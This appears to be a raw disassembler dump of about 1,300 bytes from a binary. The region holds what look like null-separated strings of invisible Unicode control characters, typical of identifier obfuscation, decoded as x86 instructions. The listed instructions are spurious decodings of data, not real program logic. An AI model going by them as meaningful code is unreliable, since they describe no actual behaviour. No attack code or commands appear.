  409b3a:	81 ad e2 80 8f e2 80 	subl   $0x81e28c80,-0x1d707f1e(%ebp)
  409b41:	8c e2 81 
  409b44:	ac                   	lods   %ds:(%esi),%al
  409b45:	e2 80                	loop   0x409ac7
  409b47:	8e e2                	mov    %edx,%fs
  409b49:	80 8e e2 80 ac e2 81 	orb    $0x81,-0x1d537f1e(%esi)
  409b50:	ab                   	stos   %eax,%es:(%edi)
  409b51:	e2 80                	loop   0x409ad3
  409b53:	8b e2                	mov    %edx,%esp
  409b55:	80 8c e2 81 ad e2 80 	orb    $0xad,-0x7f1d527f(%edx,%eiz,8)
  409b5c:	ad 
  409b5d:	e2 80                	loop   0x409adf
  409b5f:	ac                   	lods   %ds:(%esi),%al
  409b60:	e2 81                	loop   0x409ae3
  409b62:	af                   	scas   %es:(%edi),%eax
  409b63:	e2 80                	loop   0x409ae5
  409b65:	8f                   	(bad)
  409b66:	e2 80                	loop   0x409ae8
  409b68:	8d                   	lea    (bad),%esp
  409b69:	e2 80                	loop   0x409aeb
  409b6b:	8b e2                	mov    %edx,%esp
  409b6d:	80 8b e2 81 ab e2 80 	orb    $0x80,-0x1d547e1e(%ebx)
  409b74:	8b e2                	mov    %edx,%esp
  409b76:	80 ae e2 81 ac e2 80 	subb   $0x80,-0x1d537e1e(%esi)
  409b7d:	ae                   	scas   %es:(%edi),%al
  409b7e:	00 e2                	add    %ah,%dl
  409b80:	80 8c e2 80 ab e2 80 	orb    $0x8b,-0x7f1d5480(%edx,%eiz,8)
  409b87:	8b 
  409b88:	e2 80                	loop   0x409b0a
  409b8a:	8c e2                	mov    %fs,%edx
  409b8c:	81 ab e2 80 ab e2 80 	subl   $0x81e2ab80,-0x1d547f1e(%ebx)
  409b93:	ab e2 81 
  409b96:	ac                   	lods   %ds:(%esi),%al
  409b97:	e2 81                	loop   0x409b1a
  409b99:	ad                   	lods   %ds:(%esi),%eax
  409b9a:	e2 80                	loop   0x409b1c
  409b9c:	ad                   	lods   %ds:(%esi),%eax
  409b9d:	e2 81                	loop   0x409b20
  409b9f:	aa                   	stos   %al,%es:(%edi)
  409ba0:	e2 81                	loop   0x409b23
  409ba2:	ac                   	lods   %ds:(%esi),%al
  409ba3:	e2 80                	loop   0x409b25
  409ba5:	aa                   	stos   %al,%es:(%edi)
  409ba6:	e2 81                	loop   0x409b29
  409ba8:	aa                   	stos   %al,%es:(%edi)
  409ba9:	e2 81                	loop   0x409b2c
  409bab:	ae                   	scas   %es:(%edi),%al
  409bac:	e2 80                	loop   0x409b2e
  409bae:	aa                   	stos   %al,%es:(%edi)
  409baf:	e2 80                	loop   0x409b31
  409bb1:	8f                   	(bad)
  409bb2:	e2 80                	loop   0x409b34
  409bb4:	8e e2                	mov    %edx,%fs
  409bb6:	81 ae e2 81 ab e2 80 	subl   $0x81e28f80,-0x1d547e1e(%esi)
  409bbd:	8f e2 81 
  409bc0:	af                   	scas   %es:(%edi),%eax
  409bc1:	e2 80                	loop   0x409b43
  409bc3:	ad                   	lods   %ds:(%esi),%eax
  409bc4:	e2 81                	loop   0x409b47
  409bc6:	ac                   	lods   %ds:(%esi),%al
  409bc7:	e2 81                	loop   0x409b4a
  409bc9:	ae                   	scas   %es:(%edi),%al
  409bca:	e2 81                	loop   0x409b4d
  409bcc:	af                   	scas   %es:(%edi),%eax
  409bcd:	e2 81                	loop   0x409b50
  409bcf:	aa                   	stos   %al,%es:(%edi)
  409bd0:	e2 80                	loop   0x409b52
  409bd2:	ad                   	lods   %ds:(%esi),%eax
  409bd3:	e2 81                	loop   0x409b56
  409bd5:	af                   	scas   %es:(%edi),%eax
  409bd6:	e2 81                	loop   0x409b59
  409bd8:	ac                   	lods   %ds:(%esi),%al
  409bd9:	e2 81                	loop   0x409b5c
  409bdb:	aa                   	stos   %al,%es:(%edi)
  409bdc:	e2 80                	loop   0x409b5e
  409bde:	ae                   	scas   %es:(%edi),%al
  409bdf:	e2 81                	loop   0x409b62
  409be1:	af                   	scas   %es:(%edi),%eax
  409be2:	e2 81                	loop   0x409b65
  409be4:	aa                   	stos   %al,%es:(%edi)
  409be5:	e2 80                	loop   0x409b67
  409be7:	ac                   	lods   %ds:(%esi),%al
  409be8:	e2 81                	loop   0x409b6b
  409bea:	ac                   	lods   %ds:(%esi),%al
  409beb:	e2 80                	loop   0x409b6d
  409bed:	8d                   	lea    (bad),%esp
  409bee:	e2 80                	loop   0x409b70
  409bf0:	ae                   	scas   %es:(%edi),%al
  409bf1:	e2 80                	loop   0x409b73
  409bf3:	ae                   	scas   %es:(%edi),%al
  409bf4:	e2 81                	loop   0x409b77
  409bf6:	ac                   	lods   %ds:(%esi),%al
  409bf7:	e2 80                	loop   0x409b79
  409bf9:	ae                   	scas   %es:(%edi),%al
  409bfa:	00 e2                	add    %ah,%dl
  409bfc:	81 ac e2 80 8f e2 80 	subl   $0xaf81e28c,-0x7f1d7080(%edx,%eiz,8)
  409c03:	8c e2 81 af 
  409c07:	e2 81                	loop   0x409b8a
  409c09:	aa                   	stos   %al,%es:(%edi)
  409c0a:	e2 80                	loop   0x409b8c
  409c0c:	aa                   	stos   %al,%es:(%edi)
  409c0d:	e2 80                	loop   0x409b8f
  409c0f:	ac                   	lods   %ds:(%esi),%al
  409c10:	e2 80                	loop   0x409b92
  409c12:	ab                   	stos   %eax,%es:(%edi)
  409c13:	e2 80                	loop   0x409b95
  409c15:	ab                   	stos   %eax,%es:(%edi)
  409c16:	e2 80                	loop   0x409b98
  409c18:	ae                   	scas   %es:(%edi),%al
  409c19:	e2 80                	loop   0x409b9b
  409c1b:	8d                   	lea    (bad),%esp
  409c1c:	e2 80                	loop   0x409b9e
  409c1e:	ac                   	lods   %ds:(%esi),%al
  409c1f:	e2 80                	loop   0x409ba1
  409c21:	8c e2                	mov    %fs,%edx
  409c23:	80 ab e2 80 8c e2 81 	subb   $0x81,-0x1d737f1e(%ebx)
  409c2a:	aa                   	stos   %al,%es:(%edi)
  409c2b:	e2 81                	loop   0x409bae
  409c2d:	af                   	scas   %es:(%edi),%eax
  409c2e:	e2 80                	loop   0x409bb0
  409c30:	8c e2                	mov    %fs,%edx
  409c32:	80 ab e2 80 aa e2 81 	subb   $0x81,-0x1d557f1e(%ebx)
  409c39:	aa                   	stos   %al,%es:(%edi)
  409c3a:	e2 80                	loop   0x409bbc
  409c3c:	ab                   	stos   %eax,%es:(%edi)
  409c3d:	e2 81                	loop   0x409bc0
  409c3f:	ac                   	lods   %ds:(%esi),%al
  409c40:	e2 81                	loop   0x409bc3
  409c42:	ad                   	lods   %ds:(%esi),%eax
  409c43:	e2 81                	loop   0x409bc6
  409c45:	ac                   	lods   %ds:(%esi),%al
  409c46:	e2 80                	loop   0x409bc8
  409c48:	ae                   	scas   %es:(%edi),%al
  409c49:	e2 80                	loop   0x409bcb
  409c4b:	8c e2                	mov    %fs,%edx
  409c4d:	81 ad e2 80 ac e2 80 	subl   $0x81e28b80,-0x1d537f1e(%ebp)
  409c54:	8b e2 81 
  409c57:	ab                   	stos   %eax,%es:(%edi)
  409c58:	e2 81                	loop   0x409bdb
  409c5a:	ae                   	scas   %es:(%edi),%al
  409c5b:	e2 80                	loop   0x409bdd
  409c5d:	8c e2                	mov    %fs,%edx
  409c5f:	81 ad e2 80 aa e2 81 	subl   $0x81e2ae81,-0x1d557f1e(%ebp)
  409c66:	ae e2 81 
  409c69:	ae                   	scas   %es:(%edi),%al
  409c6a:	e2 81                	loop   0x409bed
  409c6c:	ab                   	stos   %eax,%es:(%edi)
  409c6d:	e2 81                	loop   0x409bf0
  409c6f:	ae                   	scas   %es:(%edi),%al
  409c70:	e2 81                	loop   0x409bf3
  409c72:	ac                   	lods   %ds:(%esi),%al
  409c73:	e2 80                	loop   0x409bf5
  409c75:	ae                   	scas   %es:(%edi),%al
  409c76:	00 e2                	add    %ah,%dl
  409c78:	81 aa e2 80 8d e2 80 	subl   $0x80e28e80,-0x1d727f1e(%edx)
  409c7f:	8e e2 80 
  409c82:	ae                   	scas   %es:(%edi),%al
  409c83:	e2 80                	loop   0x409c05
  409c85:	8b e2                	mov    %edx,%esp
  409c87:	80 aa e2 81 ae e2 80 	subb   $0x80,-0x1d517e1e(%edx)
  409c8e:	8e e2                	mov    %edx,%fs
  409c90:	80 ad e2 81 ab e2 80 	subb   $0x80,-0x1d547e1e(%ebp)
  409c97:	ae                   	scas   %es:(%edi),%al
  409c98:	e2 80                	loop   0x409c1a
  409c9a:	ad                   	lods   %ds:(%esi),%eax
  409c9b:	e2 81                	loop   0x409c1e
  409c9d:	ab                   	stos   %eax,%es:(%edi)
  409c9e:	e2 80                	loop   0x409c20
  409ca0:	8f                   	(bad)
  409ca1:	e2 80                	loop   0x409c23
  409ca3:	8c e2                	mov    %fs,%edx
  409ca5:	80 ac e2 81 ac e2 80 	subb   $0xad,-0x7f1d537f(%edx,%eiz,8)
  409cac:	ad 
  409cad:	e2 81                	loop   0x409c30
  409caf:	ae                   	scas   %es:(%edi),%al
  409cb0:	e2 81                	loop   0x409c33
  409cb2:	aa                   	stos   %al,%es:(%edi)
  409cb3:	e2 80                	loop   0x409c35
  409cb5:	8b e2                	mov    %edx,%esp
  409cb7:	80 ac e2 80 8d e2 81 	subb   $0xaf,-0x7e1d7280(%edx,%eiz,8)
  409cbe:	af 
  409cbf:	e2 80                	loop   0x409c41
  409cc1:	8d                   	lea    (bad),%esp
  409cc2:	e2 80                	loop   0x409c44
  409cc4:	8b e2                	mov    %edx,%esp
  409cc6:	80 8e e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%esi)
  409ccd:	ab                   	stos   %eax,%es:(%edi)
  409cce:	e2 81                	loop   0x409c51
  409cd0:	aa                   	stos   %al,%es:(%edi)
  409cd1:	e2 80                	loop   0x409c53
  409cd3:	8f                   	(bad)
  409cd4:	e2 80                	loop   0x409c56
  409cd6:	8f                   	(bad)
  409cd7:	e2 81                	loop   0x409c5a
  409cd9:	ae                   	scas   %es:(%edi),%al
  409cda:	e2 80                	loop   0x409c5c
  409cdc:	ad                   	lods   %ds:(%esi),%eax
  409cdd:	e2 80                	loop   0x409c5f
  409cdf:	8b e2                	mov    %edx,%esp
  409ce1:	81 ab e2 80 ae e2 81 	subl   $0x80e2ac81,-0x1d517f1e(%ebx)
  409ce8:	ac e2 80 
  409ceb:	8b e2                	mov    %edx,%esp
  409ced:	80 ad e2 80 ae 00 e2 	subb   $0xe2,0xae80e2(%ebp)
  409cf4:	80 ae e2 80 8c e2 81 	subb   $0x81,-0x1d737f1e(%esi)
  409cfb:	ae                   	scas   %es:(%edi),%al
  409cfc:	e2 81                	loop   0x409c7f
  409cfe:	ab                   	stos   %eax,%es:(%edi)
  409cff:	e2 80                	loop   0x409c81
  409d01:	ac                   	lods   %ds:(%esi),%al
  409d02:	e2 80                	loop   0x409c84
  409d04:	ab                   	stos   %eax,%es:(%edi)
  409d05:	e2 80                	loop   0x409c87
  409d07:	ab                   	stos   %eax,%es:(%edi)
  409d08:	e2 81                	loop   0x409c8b
  409d0a:	af                   	scas   %es:(%edi),%eax
  409d0b:	e2 80                	loop   0x409c8d
  409d0d:	ac                   	lods   %ds:(%esi),%al
  409d0e:	e2 80                	loop   0x409c90
  409d10:	8f                   	(bad)
  409d11:	e2 80                	loop   0x409c93
  409d13:	8b e2                	mov    %edx,%esp
  409d15:	81 ad e2 80 8e e2 81 	subl   $0x81e2ab81,-0x1d717f1e(%ebp)
  409d1c:	ab e2 81 
  409d1f:	af                   	scas   %es:(%edi),%eax
  409d20:	e2 80                	loop   0x409ca2
  409d22:	ad                   	lods   %ds:(%esi),%eax
  409d23:	e2 80                	loop   0x409ca5
  409d25:	ab                   	stos   %eax,%es:(%edi)
  409d26:	e2 80                	loop   0x409ca8
  409d28:	ac                   	lods   %ds:(%esi),%al
  409d29:	e2 81                	loop   0x409cac
  409d2b:	ad                   	lods   %ds:(%esi),%eax
  409d2c:	e2 80                	loop   0x409cae
  409d2e:	8c e2                	mov    %fs,%edx
  409d30:	81 af e2 81 ae e2 81 	subl   $0x81e2ae81,-0x1d517e1e(%edi)
  409d37:	ae e2 81 
  409d3a:	ac                   	lods   %ds:(%esi),%al
  409d3b:	e2 80                	loop   0x409cbd
  409d3d:	8e e2                	mov    %edx,%fs
  409d3f:	80 ac e2 81 aa e2 80 	subb   $0x8d,-0x7f1d557f(%edx,%eiz,8)
  409d46:	8d 
  409d47:	e2 80                	loop   0x409cc9
  409d49:	8d                   	lea    (bad),%esp
  409d4a:	e2 80                	loop   0x409ccc
  409d4c:	8c e2                	mov    %fs,%edx
  409d4e:	80 ab e2 80 8d e2 81 	subb   $0x81,-0x1d727f1e(%ebx)
  409d55:	ad                   	lods   %ds:(%esi),%eax
  409d56:	e2 80                	loop   0x409cd8
  409d58:	aa                   	stos   %al,%es:(%edi)
  409d59:	e2 81                	loop   0x409cdc
  409d5b:	af                   	scas   %es:(%edi),%eax
  409d5c:	e2 80                	loop   0x409cde
  409d5e:	ab                   	stos   %eax,%es:(%edi)
  409d5f:	e2 81                	loop   0x409ce2
  409d61:	aa                   	stos   %al,%es:(%edi)
  409d62:	e2 80                	loop   0x409ce4
  409d64:	8f                   	(bad)
  409d65:	e2 80                	loop   0x409ce7
  409d67:	aa                   	stos   %al,%es:(%edi)
  409d68:	e2 80                	loop   0x409cea
  409d6a:	ad                   	lods   %ds:(%esi),%eax
  409d6b:	e2 80                	loop   0x409ced
  409d6d:	ae                   	scas   %es:(%edi),%al
  409d6e:	00 e2                	add    %ah,%dl
  409d70:	81 ae e2 80 ad e2 80 	subl   $0x81e2ab80,-0x1d527f1e(%esi)
  409d77:	ab e2 81 
  409d7a:	ac                   	lods   %ds:(%esi),%al
  409d7b:	e2 80                	loop   0x409cfd
  409d7d:	8e e2                	mov    %edx,%fs
  409d7f:	80 ac e2 80 aa e2 80 	subb   $0xab,-0x7f1d5580(%edx,%eiz,8)
  409d86:	ab 
  409d87:	e2 80                	loop   0x409d09
  409d89:	aa                   	stos   %al,%es:(%edi)
  409d8a:	e2 81                	loop   0x409d0d
  409d8c:	ab                   	stos   %eax,%es:(%edi)
  409d8d:	e2 81                	loop   0x409d10
  409d8f:	ab                   	stos   %eax,%es:(%edi)
  409d90:	e2 81                	loop   0x409d13
  409d92:	ab                   	stos   %eax,%es:(%edi)
  409d93:	e2 80                	loop   0x409d15
  409d95:	ab                   	stos   %eax,%es:(%edi)
  409d96:	e2 80                	loop   0x409d18
  409d98:	8d                   	lea    (bad),%esp
  409d99:	e2 80                	loop   0x409d1b
  409d9b:	8b e2                	mov    %edx,%esp
  409d9d:	80 8c e2 80 8b e2 80 	orb    $0x8c,-0x7f1d7480(%edx,%eiz,8)
  409da4:	8c 
  409da5:	e2 80                	loop   0x409d27
  409da7:	ac                   	lods   %ds:(%esi),%al
  409da8:	e2 80                	loop   0x409d2a
  409daa:	aa                   	stos   %al,%es:(%edi)
  409dab:	e2 81                	loop   0x409d2e
  409dad:	ae                   	scas   %es:(%edi),%al
  409dae:	e2 81                	loop   0x409d31
  409db0:	af                   	scas   %es:(%edi),%eax
  409db1:	e2 80                	loop   0x409d33
  409db3:	8d                   	lea    (bad),%esp
  409db4:	e2 80                	loop   0x409d36
  409db6:	8f                   	(bad)
  409db7:	e2 80                	loop   0x409d39
  409db9:	8b e2                	mov    %edx,%esp
  409dbb:	80 aa e2 80 ae e2 81 	subb   $0x81,-0x1d517f1e(%edx)
  409dc2:	aa                   	stos   %al,%es:(%edi)
  409dc3:	e2 80                	loop   0x409d45
  409dc5:	8c e2                	mov    %fs,%edx
  409dc7:	81 aa e2 80 ab e2 80 	subl   $0x80e28f80,-0x1d547f1e(%edx)
  409dce:	8f e2 80 
  409dd1:	ac                   	lods   %ds:(%esi),%al
  409dd2:	e2 81                	loop   0x409d55
  409dd4:	aa                   	stos   %al,%es:(%edi)
  409dd5:	e2 81                	loop   0x409d58
  409dd7:	ac                   	lods   %ds:(%esi),%al
  409dd8:	e2 80                	loop   0x409d5a
  409dda:	aa                   	stos   %al,%es:(%edi)
  409ddb:	e2 80                	loop   0x409d5d
  409ddd:	ab                   	stos   %eax,%es:(%edi)
  409dde:	e2 80                	loop   0x409d60
  409de0:	8c e2                	mov    %fs,%edx
  409de2:	81 aa e2 80 ad e2 80 	subl   $0xe200ae80,-0x1d527f1e(%edx)
  409de9:	ae 00 e2 
  409dec:	80 ae e2 80 ab e2 80 	subb   $0x80,-0x1d547f1e(%esi)
  409df3:	ad                   	lods   %ds:(%esi),%eax
  409df4:	e2 80                	loop   0x409d76
  409df6:	8d                   	lea    (bad),%esp
  409df7:	e2 81                	loop   0x409d7a
  409df9:	aa                   	stos   %al,%es:(%edi)
  409dfa:	e2 81                	loop   0x409d7d
  409dfc:	ac                   	lods   %ds:(%esi),%al
  409dfd:	e2 80                	loop   0x409d7f
  409dff:	ac                   	lods   %ds:(%esi),%al
  409e00:	e2 80                	loop   0x409d82
  409e02:	8d                   	lea    (bad),%esp
  409e03:	e2 81                	loop   0x409d86
  409e05:	ad                   	lods   %ds:(%esi),%eax
  409e06:	e2 81                	loop   0x409d89
  409e08:	aa                   	stos   %al,%es:(%edi)
  409e09:	e2 80                	loop   0x409d8b
  409e0b:	8b e2                	mov    %edx,%esp
  409e0d:	80 ae e2 80 ac e2 80 	subb   $0x80,-0x1d537f1e(%esi)
  409e14:	8b e2                	mov    %edx,%esp
  409e16:	80 ad e2 80 ac e2 81 	subb   $0x81,-0x1d537f1e(%ebp)
  409e1d:	af                   	scas   %es:(%edi),%eax
  409e1e:	e2 80                	loop   0x409da0
  409e20:	ae                   	scas   %es:(%edi),%al
  409e21:	e2 81                	loop   0x409da4
  409e23:	af                   	scas   %es:(%edi),%eax
  409e24:	e2 81                	loop   0x409da7
  409e26:	ad                   	lods   %ds:(%esi),%eax
  409e27:	e2 80                	loop   0x409da9
  409e29:	ae                   	scas   %es:(%edi),%al
  409e2a:	e2 80                	loop   0x409dac
  409e2c:	8c e2                	mov    %fs,%edx
  409e2e:	80 8f e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%edi)
  409e35:	aa                   	stos   %al,%es:(%edi)
  409e36:	e2 80                	loop   0x409db8
  409e38:	aa                   	stos   %al,%es:(%edi)
  409e39:	e2 81                	loop   0x409dbc
  409e3b:	aa                   	stos   %al,%es:(%edi)
  409e3c:	e2 81                	loop   0x409dbf
  409e3e:	ae                   	scas   %es:(%edi),%al
  409e3f:	e2 80                	loop   0x409dc1
  409e41:	8f                   	(bad)
  409e42:	e2 81                	loop   0x409dc5
  409e44:	af                   	scas   %es:(%edi),%eax
  409e45:	e2 80                	loop   0x409dc7
  409e47:	ae                   	scas   %es:(%edi),%al
  409e48:	e2 80                	loop   0x409dca
  409e4a:	ac                   	lods   %ds:(%esi),%al
  409e4b:	e2 80                	loop   0x409dcd
  409e4d:	ab                   	stos   %eax,%es:(%edi)
  409e4e:	e2 81                	loop   0x409dd1
  409e50:	af                   	scas   %es:(%edi),%eax
  409e51:	e2 80                	loop   0x409dd3
  409e53:	8b e2                	mov    %edx,%esp
  409e55:	81 ad e2 80 8d e2 81 	subl   $0x81e2af81,-0x1d727f1e(%ebp)
  409e5c:	af e2 81 
  409e5f:	ab                   	stos   %eax,%es:(%edi)
  409e60:	e2 80                	loop   0x409de2
  409e62:	ad                   	lods   %ds:(%esi),%eax
  409e63:	e2 80                	loop   0x409de5
  409e65:	ae                   	scas   %es:(%edi),%al
  409e66:	00 e2                	add    %ah,%dl
  409e68:	81 ae e2 80 8e e2 81 	subl   $0x81e2ad81,-0x1d717f1e(%esi)
  409e6f:	ad e2 81 
  409e72:	ad                   	lods   %ds:(%esi),%eax
  409e73:	e2 80                	loop   0x409df5
  409e75:	ac                   	lods   %ds:(%esi),%al
  409e76:	e2 80                	loop   0x409df8
  409e78:	ab                   	stos   %eax,%es:(%edi)
  409e79:	e2 80                	loop   0x409dfb
  409e7b:	8c e2                	mov    %fs,%edx
  409e7d:	81 ab e2 81 aa e2 81 	subl   $0x80e2ac81,-0x1d557e1e(%ebx)
  409e84:	ac e2 80 
  409e87:	8e e2                	mov    %edx,%fs
  409e89:	80 ac e2 80 8e e2 80 	subb   $0x8e,-0x7f1d7180(%edx,%eiz,8)
  409e90:	8e 
  409e91:	e2 80                	loop   0x409e13
  409e93:	8e e2                	mov    %edx,%fs
  409e95:	80 8d e2 80 aa e2 80 	orb    $0x80,-0x1d557f1e(%ebp)
  409e9c:	ac                   	lods   %ds:(%esi),%al
  409e9d:	e2 80                	loop   0x409e1f
  409e9f:	8d                   	lea    (bad),%esp
  409ea0:	e2 80                	loop   0x409e22
  409ea2:	aa                   	stos   %al,%es:(%edi)
  409ea3:	e2 81                	loop   0x409e26
  409ea5:	ac                   	lods   %ds:(%esi),%al
  409ea6:	e2 80                	loop   0x409e28
  409ea8:	8b e2                	mov    %edx,%esp
  409eaa:	81 ac e2 80 8d e2 80 	subl   $0x8d80e2aa,-0x7f1d7280(%edx,%eiz,8)
  409eb1:	aa e2 80 8d 
  409eb5:	e2 80                	loop   0x409e37
  409eb7:	aa                   	stos   %al,%es:(%edi)
  409eb8:	e2 80                	loop   0x409e3a
  409eba:	aa                   	stos   %al,%es:(%edi)
  409ebb:	e2 81                	loop   0x409e3e
  409ebd:	ae                   	scas   %es:(%edi),%al
  409ebe:	e2 80                	loop   0x409e40
  409ec0:	8f                   	(bad)
  409ec1:	e2 80                	loop   0x409e43
  409ec3:	ac                   	lods   %ds:(%esi),%al
  409ec4:	e2 80                	loop   0x409e46
  409ec6:	ab                   	stos   %eax,%es:(%edi)
  409ec7:	e2 81                	loop   0x409e4a
  409ec9:	ad                   	lods   %ds:(%esi),%eax
  409eca:	e2 80                	loop   0x409e4c
  409ecc:	ab                   	stos   %eax,%es:(%edi)
  409ecd:	e2 80                	loop   0x409e4f
  409ecf:	ae                   	scas   %es:(%edi),%al
  409ed0:	e2 81                	loop   0x409e53
  409ed2:	ae                   	scas   %es:(%edi),%al
  409ed3:	e2 80                	loop   0x409e55
  409ed5:	aa                   	stos   %al,%es:(%edi)
  409ed6:	e2 81                	loop   0x409e59
  409ed8:	ac                   	lods   %ds:(%esi),%al
  409ed9:	e2 80                	loop   0x409e5b
  409edb:	ad                   	lods   %ds:(%esi),%eax
  409edc:	e2 80                	loop   0x409e5e
  409ede:	ad                   	lods   %ds:(%esi),%eax
  409edf:	e2 80                	loop   0x409e61
  409ee1:	ae                   	scas   %es:(%edi),%al
  409ee2:	00 e2                	add    %ah,%dl
  409ee4:	81 ae e2 80 ae e2 81 	subl   $0x80e2ad81,-0x1d517f1e(%esi)
  409eeb:	ad e2 80 
  409eee:	8d                   	lea    (bad),%esp
  409eef:	e2 80                	loop   0x409e71
  409ef1:	8e e2                	mov    %edx,%fs
  409ef3:	80 aa e2 81 ab e2 80 	subb   $0x80,-0x1d547e1e(%edx)
  409efa:	ae                   	scas   %es:(%edi),%al
  409efb:	e2 80                	loop   0x409e7d
  409efd:	ac                   	lods   %ds:(%esi),%al
  409efe:	e2 80                	loop   0x409e80
  409f00:	8d                   	lea    (bad),%esp
  409f01:	e2 80                	loop   0x409e83
  409f03:	8b e2                	mov    %edx,%esp
  409f05:	81 ac e2 81 ab e2 80 	subl   $0x8e80e2ac,-0x7f1d547f(%edx,%eiz,8)
  409f0c:	ac e2 80 8e 
  409f10:	e2 81                	loop   0x409e93
  409f12:	aa                   	stos   %al,%es:(%edi)
  409f13:	e2 81                	loop   0x409e96
  409f15:	ad                   	lods   %ds:(%esi),%eax
  409f16:	e2 80                	loop   0x409e98
  409f18:	8b e2                	mov    %edx,%esp
  409f1a:	81 aa e2 80 ae e2 81 	subl   $0x81e2aa81,-0x1d517f1e(%edx)
  409f21:	aa e2 81 
  409f24:	ae                   	scas   %es:(%edi),%al
  409f25:	e2 80                	loop   0x409ea7
  409f27:	ab                   	stos   %eax,%es:(%edi)
  409f28:	e2 80                	loop   0x409eaa
  409f2a:	8f                   	(bad)
  409f2b:	e2 80                	loop   0x409ead
  409f2d:	8e e2                	mov    %edx,%fs
  409f2f:	80 ad e2 81 ac e2 81 	subb   $0x81,-0x1d537e1e(%ebp)
  409f36:	ae                   	scas   %es:(%edi),%al
  409f37:	e2 81                	loop   0x409eba
  409f39:	af                   	scas   %es:(%edi),%eax
  409f3a:	e2 80                	loop   0x409ebc
  409f3c:	8c e2                	mov    %fs,%edx
  409f3e:	80 ac e2 81 ae e2 80 	subb   $0x8e,-0x7f1d517f(%edx,%eiz,8)
  409f45:	8e 
  409f46:	e2 81                	loop   0x409ec9
  409f48:	ac                   	lods   %ds:(%esi),%al
  409f49:	e2 80                	loop   0x409ecb
  409f4b:	8b e2                	mov    %edx,%esp
  409f4d:	81 ab e2 80 8b e2 80 	subl   $0x80e28b80,-0x1d747f1e(%ebx)
  409f54:	8b e2 80 
  409f57:	ae                   	scas   %es:(%edi),%al
  409f58:	e2 80                	loop   0x409eda
  409f5a:	ad                   	lods   %ds:(%esi),%eax
  409f5b:	e2 80                	loop   0x409edd
  409f5d:	ae                   	scas   %es:(%edi),%al
  409f5e:	00 e2                	add    %ah,%dl
  409f60:	80 ae e2 81 ab e2 80 	subb   $0x80,-0x1d547e1e(%esi)
  409f67:	8e e2                	mov    %edx,%fs
  409f69:	81 ae e2 81 ad e2 80 	subl   $0x80e28f80,-0x1d527e1e(%esi)
  409f70:	8f e2 80 
  409f73:	8f                   	(bad)
  409f74:	e2 80                	loop   0x409ef6
  409f76:	8b e2                	mov    %edx,%esp
  409f78:	80 ab e2 80 aa e2 81 	subb   $0x81,-0x1d557f1e(%ebx)
  409f7f:	af                   	scas   %es:(%edi),%eax
  409f80:	e2 80                	loop   0x409f02
  409f82:	ac                   	lods   %ds:(%esi),%al
  409f83:	e2 80                	loop   0x409f05
  409f85:	8c e2                	mov    %fs,%edx
  409f87:	81 ae e2 80 8e e2 81 	subl   $0x80e2ab81,-0x1d717f1e(%esi)
  409f8e:	ab e2 80 
  409f91:	ac                   	lods   %ds:(%esi),%al
  409f92:	e2 80                	loop   0x409f14
  409f94:	ae                   	scas   %es:(%edi),%al
  409f95:	e2 80                	loop   0x409f17
  409f97:	ae                   	scas   %es:(%edi),%al
  409f98:	e2 80                	loop   0x409f1a
  409f9a:	ab                   	stos   %eax,%es:(%edi)
  409f9b:	e2 80                	loop   0x409f1d
  409f9d:	8e e2                	mov    %edx,%fs
  409f9f:	80 ad e2 81 ae e2 81 	subb   $0x81,-0x1d517e1e(%ebp)
  409fa6:	af                   	scas   %es:(%edi),%eax
  409fa7:	e2 81                	loop   0x409f2a
  409fa9:	ac                   	lods   %ds:(%esi),%al
  409faa:	e2 80                	loop   0x409f2c
  409fac:	8f                   	(bad)
  409fad:	e2 81                	loop   0x409f30
  409faf:	af                   	scas   %es:(%edi),%eax
  409fb0:	e2 80                	loop   0x409f32
  409fb2:	8b e2                	mov    %edx,%esp
  409fb4:	80 ac e2 81 ac e2 80 	subb   $0xaa,-0x7f1d537f(%edx,%eiz,8)
  409fbb:	aa 
  409fbc:	e2 81                	loop   0x409f3f
  409fbe:	af                   	scas   %es:(%edi),%eax
  409fbf:	e2 81                	loop   0x409f42
  409fc1:	aa                   	stos   %al,%es:(%edi)
  409fc2:	e2 80                	loop   0x409f44
  409fc4:	8f                   	(bad)
  409fc5:	e2 81                	loop   0x409f48
  409fc7:	ab                   	stos   %eax,%es:(%edi)
  409fc8:	e2 80                	loop   0x409f4a
  409fca:	ab                   	stos   %eax,%es:(%edi)
  409fcb:	e2 80                	loop   0x409f4d
  409fcd:	8f                   	(bad)
  409fce:	e2 80                	loop   0x409f50
  409fd0:	8b e2                	mov    %edx,%esp
  409fd2:	81 ae e2 80 ad e2 80 	subl   $0xe200ae80,-0x1d527f1e(%esi)
  409fd9:	ae 00 e2 
  409fdc:	81 aa e2 80 ac e2 80 	subl   $0x80e28d80,-0x1d537f1e(%edx)
  409fe3:	8d e2 80 
  409fe6:	aa                   	stos   %al,%es:(%edi)
  409fe7:	e2 80                	loop   0x409f69
  409fe9:	8e e2                	mov    %edx,%fs
  409feb:	81 ae e2 81 aa e2 81 	subl   $0x81e2ac81,-0x1d557e1e(%esi)
  409ff2:	ac e2 81 
  409ff5:	aa                   	stos   %al,%es:(%edi)
  409ff6:	e2 80                	loop   0x409f78
  409ff8:	8b e2                	mov    %edx,%esp
  409ffa:	81 ab e2 80 ad e2 80 	subl   $0x80e28f80,-0x1d527f1e(%ebx)
  40a001:	8f e2 80 
  40a004:	ae                   	scas   %es:(%edi),%al
  40a005:	e2 80                	loop   0x409f87
  40a007:	8f                   	(bad)
  40a008:	e2 81                	loop   0x409f8b
  40a00a:	aa                   	stos   %al,%es:(%edi)
  40a00b:	e2 80                	loop   0x409f8d
  40a00d:	ac                   	lods   %ds:(%esi),%al
  40a00e:	e2 80                	loop   0x409f90
  40a010:	aa                   	stos   %al,%es:(%edi)
  40a011:	e2 80                	loop   0x409f93
  40a013:	8f                   	(bad)
  40a014:	e2 80                	loop   0x409f96
  40a016:	8d                   	lea    (bad),%esp
  40a017:	e2 80                	loop   0x409f99
  40a019:	8b e2                	mov    %edx,%esp
  40a01b:	80 8c e2 80 8d e2 80 	orb    $0x8d,-0x7f1d7280(%edx,%eiz,8)
  40a022:	8d 
  40a023:	e2 80                	loop   0x409fa5
  40a025:	ad                   	lods   %ds:(%esi),%eax
  40a026:	e2 81                	loop   0x409fa9
  40a028:	ad                   	lods   %ds:(%esi),%eax
  40a029:	e2 81                	loop   0x409fac
  40a02b:	ad                   	lods   %ds:(%esi),%eax
  40a02c:	e2 80                	loop   0x409fae
  40a02e:	ac                   	lods   %ds:(%esi),%al
  40a02f:	e2 81                	loop   0x409fb2
  40a031:	af                   	scas   %es:(%edi),%eax
